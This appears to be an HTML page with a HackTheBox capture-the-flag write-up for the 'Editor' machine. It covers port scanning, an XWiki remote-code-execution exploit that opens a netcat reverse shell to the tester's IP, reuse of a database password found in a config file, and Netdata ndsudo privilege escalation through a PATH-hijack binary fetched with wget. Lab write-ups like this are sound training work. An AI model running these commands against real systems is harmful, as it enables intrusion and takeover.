<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Editor</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-main: #0d1117;
            --card-bg: #161b22;
            --text-main: #c9d1d9;
            --text-muted: #8b949e;
            --accent: #39d353;
            --accent-hover: #2ea043;
            --heading: #00ff88;
            --border: #30363d;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'JetBrains Mono', 'Segoe UI', sans-serif;
            background-color: var(--bg-main);
            color: var(--text-main);
            line-height: 1.7;
            padding: 30px 15px;
            min-height: 100vh;
        }
        .container { max-width: 900px; margin: 0 auto; }
        .card {
            background: var(--card-bg);
            border: 1px solid var(--border);
            border-radius: 16px;
            padding: 40px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
        }
        h1 {font-size: 2.6em; color: var(--heading); text-align: center; margin-bottom: 10px; font-weight: 600;}
        .subtitle {text-align: center; color: var(--text-muted); margin-bottom: 50px; font-size: 1.15em;}
        h2 {color: var(--heading); font-size: 1.8em; margin: 35px 0 18px 0; padding-bottom: 8px; border-bottom: 2px solid var(--accent); display: inline-block;}
        p, pre, ul {margin-bottom: 20px; font-size: 1.1em;}
        strong {color: #ffffff;}
        code {background: #21262d; padding: 2px 8px; border-radius: 6px;}
        pre {background: #21262d; padding: 16px; border-radius: 10px; overflow-x: auto; border: 1px solid var(--border);}
        a {color: var(--accent); text-decoration: none;}
        a:hover {color: var(--accent-hover); text-decoration: underline;}
        table {border-collapse: collapse; width: 100%; margin: 20px 0;}
        th, td {border: 1px solid var(--border); padding: 10px; text-align: left;}
        th {background: #21262d;}
        @media (max-width: 768px) {.card {padding: 25px;} h1 {font-size: 2.2em;}}
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1>Editor</h1>
            <p class="subtitle">HackTheBox • XWiki RCE → Jetty → Netdata ndsudo PrivEsc</p>

            <h2>Initial Enumeration</h2>
            <p><strong>Target:</strong> <code>10.10.11.80</code></p>
            <pre>nmap -sV -Pn -T5 10.10.11.80</pre>
            <table>
                <tr><th>PORT</th><th>STATE</th><th>SERVICE</th><th>VERSION</th></tr>
                <tr><td>22/tcp</td><td>open</td><td>ssh</td><td>OpenSSH 8.9p1 Ubuntu</td></tr>
                <tr><td>80/tcp</td><td>open</td><td>http</td><td>nginx 1.18.0 (Ubuntu)</td></tr>
                <tr><td>8080/tcp</td><td>open</td><td>http</td><td>Jetty 10.0.20</td></tr>
            </table>

            <h2>Foothold – XWiki RCE (CVE-2025-24893)</h2>
            <p>Visiting <a href="http://wiki.editor.htb/xwiki/bin/view/Main/">http://wiki.editor.htb/xwiki/bin/view/Main/</a> reveals <strong>XWiki Debian 15.10.8</strong> at the footer.</p>
            <p>Exploit: <a href="https://github.com/gunzf0x/CVE-2025-24893">https://github.com/gunzf0x/CVE-2025-24893</a></p>
            <pre>nc -lvnp 4444
python3 CVE-2025-24893.py -t 'http://editor.htb:8080' -c 'busybox nc 10.10.14.160 4444 -e /bin/bash'</pre>
            <p>→ Reverse shell получен.</p>

            <h2>User Flag – Oliver</h2>
            <p>In <code>/usr/lib/xwiki-jetty/webapps/xwiki/WEB-INF/hibernate.cfg.xml</code>:</p>
            <pre>cat hibernate.cfg.xml | grep password
# → theEd1t0rTeam99</pre>
            <pre>ssh oliver@10.10.11.80
# password: theEd1t0rTeam99
cat /home/oliver/user.txt</pre>

            <h2>Privilege Escalation – Netdata ndsudo (CVE-2024-32019)</h2>
            <pre>find / -user root -perm -4000 -print 2>/dev/null
# → /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo</pre>
            <p>Exploit POC: <a href="https://github.com/AzureADTrent/CVE-2024-32019-POC">https://github.com/AzureADTrent/CVE-2024-32019-POC</a></p>
            <pre>gcc poc.c -o nvme
python3 -m http.server 8000   # на атакуващата машина
wget http://10.10.14.x:8000/nvme -O /tmp/nvme
chmod +x /tmp/nvme
export PATH=/tmp:$PATH
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list</pre>
            <p>→ Получаваме root shell и четем root flag.</p>

            <h2>Flags</h2>
            <p><strong>user.txt :</strong>   (oliver)<br>
            <strong>root.txt :</strong>   (root)</p>

        </div>
    </div>
</body>
</html>